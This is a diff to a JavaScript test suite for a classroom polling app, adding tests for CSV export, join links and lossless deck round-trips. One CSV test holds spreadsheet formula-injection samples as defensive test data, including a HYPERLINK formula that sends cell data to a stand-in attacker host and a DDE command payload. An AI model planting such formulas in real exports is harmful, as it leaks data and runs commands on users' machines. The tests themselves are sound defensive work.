@@ -13,7 +13,7 @@ import {
   validateResponse, aggregate, normaliseWord, cleanText,
   scoreAnswer, quizLeaderboard, computeDelta,
   buildCSV, toCSVValue, sessionToCSVRows, CSV_HEADERS, payloadToText,
-  correctIndices, optionLabels, generateJoinCode, joinURL,
+  correctIndices, optionLabels, generateJoinCode, joinURL, joinURLPretty,
   neighbourQuestion, sortedQuestions, MULTI_SUBMIT_TYPES,
   splitPassage, promptKey, isContentSlide, fillJoinPlaceholders, DEFAULT_JOIN_STEPS,
   questionNumber, retypeQuestion, defaultConfig, TYPE_LABELS, promptScale, showSlideLabel, QUESTION_TYPES, CONTENT_TYPES,
@@ -21,6 +21,7 @@ import {
 } from '../app/logic.js';
 import { readFileSync, statSync } from 'node:fs';
 import { parseDeck, serialiseDeck, SAMPLE_DECK } from '../app/deck-format.js';
+import { TEMPLATES } from '../app/templates.js';
 import { ambiencePlan, ambienceLevel } from '../app/ambience.js';
 import {
   BACKGROUND_PRESETS, CHART_STYLES, THEMES, CUSTOM_FONTS,
@@ -541,6 +542,50 @@ describe('CSV export (P5)', () => {
     const rows = sessionToCSVRows({}, [], [{ question_id: 'gone', payload: {} }]);
     eq(rows.length, 0);
   });
+
+  // The export exists to be opened in Excel, and an open-ended answer is
+  // a box a student types anything into. Quoting does not stop a formula:
+  // the quotes come off before the cell is evaluated.
+  it('neutralises cells a spreadsheet would run as a formula', () => {
+    const attack = '=HYPERLINK("http://evil.test?x="&A1,"Grades")';
+    const cell = toCSVValue(attack);
+    ok(cell.startsWith("\"'="), `formula cell must be text-guarded, got ${cell}`);
+    // the answer itself is still there, just inert
+    ok(cell.includes('evil.test'));
+
+    for (const s of ['=1+1', '+1+1', '-1+cmd|\' /c calc\'!A0', '@SUM(A1)', '\tcmd']) {
+      ok(toCSVValue(s).replace(/^"/, '').startsWith("'"), `must guard ${JSON.stringify(s)}`);
+    }
+  });
+
+  it('leaves ordinary values — including negative numbers — untouched', () => {
+    eq(toCSVValue('-3'), '-3');
+    eq(toCSVValue('-12.5'), '-12.5');
+    eq(toCSVValue(-7), '-7');
+    eq(toCSVValue('plain'), 'plain');
+    eq(toCSVValue('a,b'), '"a,b"');
+    eq(toCSVValue('say "hi"'), '"say ""hi"""');
+    eq(buildCSV([{ a: '=cmd', b: 'ok' }], ['a', 'b']), "a,b\r\n'=cmd,ok");
+  });
+
+  it('numbers questions the way the room was numbered', () => {
+    // a deck opening with an instructions slide: the projector and every
+    // phone said "Question 1 of 2" for q1, so the CSV must say 1 as well
+    const questions = [
+      { id: 'i1', position: 0, type: 'instructions', prompt: 'How to join', config: { steps: ['a'] } },
+      { id: 'q1', position: 1, type: 'multiple_choice', prompt: 'Pick', config: { options: ['A', 'B'] } },
+      { id: 'q2', position: 2, type: 'open_ended', prompt: 'Say', config: {} },
+    ];
+    const responses = [
+      { question_id: 'q1', round: 1, pseudonym: 'Amber Falcon', payload: { choices: [0] } },
+      { question_id: 'q2', round: 1, pseudonym: 'Amber Falcon', payload: { text: 'hi' } },
+    ];
+    const rows = sessionToCSVRows({ label: 'S' }, questions, responses);
+    eq(rows.map((r) => r.question_number), [1, 2]);
+    // and it agrees with what the room was actually told
+    eq(rows[0].question_number, questionNumber(questions, 'q1').number);
+    eq(rows[1].question_number, questionNumber(questions, 'q2').number);
+  });
 });
 
 // =====================================================================
@@ -559,7 +604,17 @@ describe('join codes and navigation', () => {
 
   it('builds a join URL that lands straight on the response screen', () => {
     eq(joinURL('https://x.github.io/surveyall/', 'ABC123'),
-      'https://x.github.io/surveyall/join.html#ABC123');
+      'https://x.github.io/surveyall/join#ABC123');
+  });
+
+  // The room is told one address. What the QR encodes and what the
+  // projector prints have to be the same string, minus the parts nobody
+  // types — printing a bare host while the QR went to /join is exactly
+  // the drift this pins down.
+  it('prints the join link the same way it encodes it', () => {
+    eq(joinURLPretty('https://surveyall.org', 'ABC123'), 'surveyall.org/join');
+    eq(joinURLPretty('https://x.github.io/surveyall/', 'ABC123'),
+      'x.github.io/surveyall/join');
   });
 
   it('walks questions in position order regardless of input order', () => {
@@ -687,6 +742,145 @@ Ask away`);
       eq(again.questions[i].config.statements, q.config.statements, `statements of question ${i + 1}`);
       eq(again.questions[i].config.steps, q.config.steps, `steps of question ${i + 1}`);
     });
+  });
+});
+
+// =====================================================================
+// "Decks are plain text and round-trip" is the headline promise of the
+// format, and SAMPLE_DECK alone is far too well-behaved to test it: it
+// has no colons in a prompt, no blank options, no "#" prompt. These are
+// the cases that were losing an instructor's questions.
+describe('the deck format is lossless', () => {
+  const reparse = (q, deck = { title: 'Deck', theme: 'lecture-hall' }) =>
+    parseDeck(serialiseDeck(deck, [q])).questions[0];
+
+  it('round-trips every prompt in the shipped activity library', () => {
+    for (const t of TEMPLATES) {
+      const text = serialiseDeck({ title: t.name }, t.questions);
+      const again = parseDeck(text);
+      eq(again.questions.length, t.questions.length, `${t.id}: question count`);
+      t.questions.forEach((q, i) => {
+        eq(again.questions[i].type, q.type, `${t.id} q${i + 1}: type`);
+        eq(again.questions[i].prompt, q.prompt, `${t.id} q${i + 1}: prompt`);
+      });
+    }
+  });
+
+  it('keeps a prompt that contains a colon', () => {
+    // "Weber: what did he mean by rationalisation?" is a question, not a
+    // setting called "weber"
+    const q = reparse({ type: 'open_ended', prompt: 'Weber: what did he mean by rationalisation?', config: {} });
+    eq(q.prompt, 'Weber: what did he mean by rationalisation?');
+    notOk('weber' in q.config, 'a colon in a prompt must not become a config key');
+
+    const direct = parseDeck('## open_ended\nEdit me: a question with several defensible answers');
+    eq(direct.questions[0].prompt, 'Edit me: a question with several defensible answers');
+  });
+
+  it('still reads a real setting written above the prompt', () => {
+    const deck = parseDeck(`## word_cloud
+max_words: 3
+One word for how the reading left you`);
+    eq(deck.questions[0].prompt, 'One word for how the reading left you');
+    eq(deck.questions[0].config.max_words, 3);
+  });
+
+  it('keeps a prompt that starts with "#" and the deck title with it', () => {
+    const text = serialiseDeck({ title: 'Week 9' },
+      [{ type: 'open_ended', prompt: '#MeToo — was it a turning point?', config: {} }]);
+    const again = parseDeck(text);
+    eq(again.title, 'Week 9');
+    eq(again.questions[0].prompt, '#MeToo — was it a turning point?');
+  });
+
+  it('keeps a blank option in place instead of gluing it to the prompt', () => {
+    const q = reparse({
+      type: 'multiple_choice',
+      prompt: 'Which is a social institution?',
+      config: { options: ['Marriage', '', 'The economy'] },
+    });
+    eq(q.prompt, 'Which is a social institution?');
+    eq(q.config.options, ['Marriage', '', 'The economy']);
+  });
+
+  it('keeps a blank statement, item and step too', () => {
+    eq(reparse({ type: 'scales', prompt: 'Rate', config: { statements: ['Clear', ''], min: 1, max: 5 } })
+      .config.statements, ['Clear', '']);
+    eq(reparse({ type: 'ranking', prompt: 'Rank', config: { items: ['A', '', 'B'] } })
+      .config.items, ['A', '', 'B']);
+    eq(reparse({ type: 'instructions', prompt: 'Join', config: { steps: ['Scan the code', ''] } })
+      .config.steps, ['Scan the code', '']);
+    eq(reparse({ type: 'timeline', prompt: 'Order', config: { items: ['', 'Second'] } })
+      .config.items, ['', 'Second']);
+    eq(reparse({ type: 'budget', prompt: 'Fund', config: { options: ['Libraries', ''], total: 100 } })
+      .config.options, ['Libraries', '']);
+    eq(reparse({ type: 'exit_ticket', prompt: 'Close', config: { prompts: ['Learned', ''], max_length: 200 } })
+      .config.prompts, ['Learned', '']);
+  });
+
+  it('does not corrupt a brand-new, not-yet-filled-in slide of any type', () => {
+    for (const type of QUESTION_TYPES) {
+      const prompt = `Prompt for ${type}`;
+      const q = reparse({ type, prompt, config: defaultConfig(type) });
+      ok(q, `${type}: slide survives a round-trip`);
+      eq(q.type, type, `${type}: type`);
+      eq(q.prompt, prompt, `${type}: an empty option must not land in the prompt`);
+      for (const key of ['options', 'items', 'statements', 'samples', 'steps', 'prompts', 'pairs']) {
+        if (Array.isArray(defaultConfig(type)[key])) {
+          eq(q.config[key].length, defaultConfig(type)[key].length, `${type}: ${key} count`);
+        }
+      }
+    }
+  });
+
+  it('keeps a heatmap on highlight when it also carries labels', () => {
+    const q = reparse({
+      type: 'heatmap',
+      prompt: 'Mark the passage',
+      config: { passage: 'One. | Two.', segments: ['One.', 'Two.'], mode: 'highlight', labels: ['claim', 'evidence'] },
+    });
+    eq(q.config.mode, 'highlight');
+    eq(q.config.labels, ['claim', 'evidence']);
+    // labels alone still imply classify, which is the useful default
+    eq(parseDeck('## heatmap\nP\n> a | b\nlabels: claim, evidence').questions[0].config.mode, 'classify');
+  });
+
+  it('keeps a comma inside a label', () => {
+    const q = reparse({
+      type: 'heatmap',
+      prompt: 'Classify',
+      config: { passage: 'a | b', segments: ['a', 'b'], mode: 'classify', labels: ['Claim, unsupported', 'Evidence'] },
+    });
+    eq(q.config.labels, ['Claim, unsupported', 'Evidence']);
+  });
+
+  it('keeps an unset scale anchor unset rather than rating it 0', () => {
+    const q = reparse({
+      type: 'scales',
+      prompt: 'Rate',
+      config: { statements: ['S1', 'S2', 'S3'], min: 1, max: 5, anchors: [1, null, 5] },
+    });
+    // 0 is off the bottom of a 1..5 scale — it would read as an opinion
+    // the instructor never gave
+    eq(q.config.anchors, [1, null, 5]);
+  });
+
+  it('round-trips how hard a photo backdrop is pushed back', () => {
+    const bg = { kind: 'image', url: 'https://example.edu/quad.jpg', dim: 0.8, blur: 6 };
+    const again = parseDeck(serialiseDeck({ title: 'D', theme: 'lecture-hall', background: bg },
+      [{ type: 'qa', prompt: 'Ask', config: {} }]));
+    eq(again.background, bg);
+
+    // the default stays implicit, and a non-photo backdrop never carries
+    // dim/blur into the ambience engine
+    const plain = { kind: 'image', url: 'https://example.edu/quad.jpg', dim: 0.45, blur: 0 };
+    const text = serialiseDeck({ title: 'D', background: plain }, [{ type: 'qa', prompt: 'Ask', config: {} }]);
+    notOk(/dim:|blur:/.test(text), 'defaults should not be written out');
+    eq(parseDeck(text).background, plain);
+    eq(parseDeck('# D\ndim: 0.8\nblur: 4\nbackground: dots\n## qa\nAsk').background,
+      { kind: 'preset', id: 'dots' });
+    // and either order works over a photo
+    eq(parseDeck('# D\ndim: 80%\nbackground: https://e.edu/q.jpg\n## qa\nAsk').background.dim, 0.8);
   });
 });
 
